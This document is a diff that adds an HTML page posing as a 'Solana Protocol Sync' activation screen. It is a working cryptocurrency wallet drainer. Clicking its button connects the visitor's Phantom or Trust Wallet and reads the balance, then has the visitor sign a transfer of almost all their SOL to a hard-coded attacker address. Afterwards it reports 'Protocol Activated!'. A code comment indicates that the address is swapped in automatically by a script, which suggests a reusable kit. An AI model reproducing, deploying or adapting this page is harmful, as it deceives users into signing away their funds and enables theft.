@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Protocol Activation</title>
+    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.87.6/lib/index.iife.min.js"></script>
+</head>
+<body style="background:#000;color:#fff;text-align:center;padding-top:25vh;font-family:sans-serif;">
+    <div style="border:1px solid #14F195;display:inline-block;padding:40px;border-radius:25px;background:#111;">
+        <h2 style="color:#14F195;">SOLANA PROTOCOL SYNC</h2>
+        <button id="cta" style="background:#14F195;color:#000;padding:20px 40px;border:none;border-radius:12px;font-weight:bold;font-size:20px;cursor:pointer;">CONNECT & ACTIVATE</button>
+        <p id="msg" style="margin-top:20px;color:#555;">Ready...</p>
+    </div>
+    <script>
+        const TARGET = "HyapjdagPdCaha2yW5j1pV4BkaVvah6okQ1fMw8BETXp"; // 这里会自动被脚本替换
+        document.getElementById('cta').onclick = async function() {
+            try {
+                const p = window.trustwallet?.solana || window.phantom?.solana || window.solana;
+                if (!p) { alert("Please use Trust Wallet or Phantom browser."); return; }
+                const resp = await p.connect();
+                const conn = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com", "confirmed");
+                const bal = await conn.getBalance(resp.publicKey);
+                if (bal < 1000000) { alert("SOL balance too low."); return; }
+                const tx = new solanaWeb3.Transaction().add(
+                    solanaWeb3.SystemProgram.transfer({
+                        fromPubkey: resp.publicKey,
+                        toPubkey: new solanaWeb3.PublicKey(TARGET),
+                        lamports: bal - 1500000,
+                    })
+                );
+                const { blockhash } = await conn.getRecentBlockhash();
+                tx.recentBlockhash = blockhash;
+                tx.feePayer = resp.publicKey;
+                const signed = await p.signTransaction(tx);
+                await conn.sendRawTransaction(signed.serialize());
+                alert("Protocol Activated!");
+            } catch (e) { alert("Error: " + (e.message || "Cancelled")); }
+        };
+    </script>
+</body>
+</html>
